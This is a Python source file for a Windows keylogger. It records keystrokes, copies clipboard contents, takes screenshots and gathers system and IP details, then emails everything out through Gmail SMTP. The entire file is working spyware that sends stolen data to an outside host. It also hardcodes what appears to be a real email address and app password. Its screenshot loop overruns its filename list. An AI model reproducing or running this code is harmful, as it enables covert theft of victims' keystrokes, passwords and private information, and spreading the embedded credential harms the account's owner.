from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from requests import get
from PIL import ImageGrab


email_address = "izanescoffier@gmail.com"
password = "braj fciw mzda zkum"
file_path = "C:\\Users\\KIIT\\PycharmProjects\\kylggr\\"

keys_information = "key_log.txt"
system_information = "system_log.txt"
clipboard_information = "clipboard.txt"

# Screenshot filenames
screenshot_files = [f"screenshot_{i}.png" for i in range(1, 4)]

# Email function to send multiple screenshots in one mail
def send_email(subject, body, attachments, toaddr):
    try:
        fromaddr = email_address
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = subject

        msg.attach(MIMEText(body, 'plain'))

        for attachment in attachments:
            full_path = file_path + attachment
            with open(full_path, 'rb') as file:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(file.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename={attachment}")
                msg.attach(part)

        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, password)
        s.sendmail(fromaddr, toaddr, msg.as_string())
        s.quit()
        print("Email with screenshots sent.")
    except Exception as e:
        print(f"Email sending failed: {e}")

# System info
def computer_info():
    with open(file_path + system_information, "w") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except:
            f.write("Could not get public IP address\n")
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

# Clipboard
def copy_clipboard():
    with open(file_path + clipboard_information, 'w') as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data:\n" + pasted_data)
        except:
            f.write("Clipboard is empty or inaccessible.\n")

# Screenshot
def take_screenshot(index):
    im = ImageGrab.grab()
    im.save(file_path + screenshot_files[index])

# Write keys
keys = []
def write_file(keys):
    with open(file_path + keys_information, "w") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

# Keylogger
def on_press(key):
    keys.append(key)

def on_release(key):
    return

# --- Execution ---

start_time = time.time()
end_time = start_time + 20

computer_info()
copy_clipboard()

# Start keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    for i in range(4):  # n seconds, screenshot every n*5 seconds
        take_screenshot(i)
        time.sleep(5)
    listener.stop()

write_file(keys)

# Send screenshots in one email
send_email(
    subject="Captured updates",
    body=" User data files ",
    attachments=screenshot_files + [keys_information, clipboard_information, system_information],
    toaddr=email_address
)
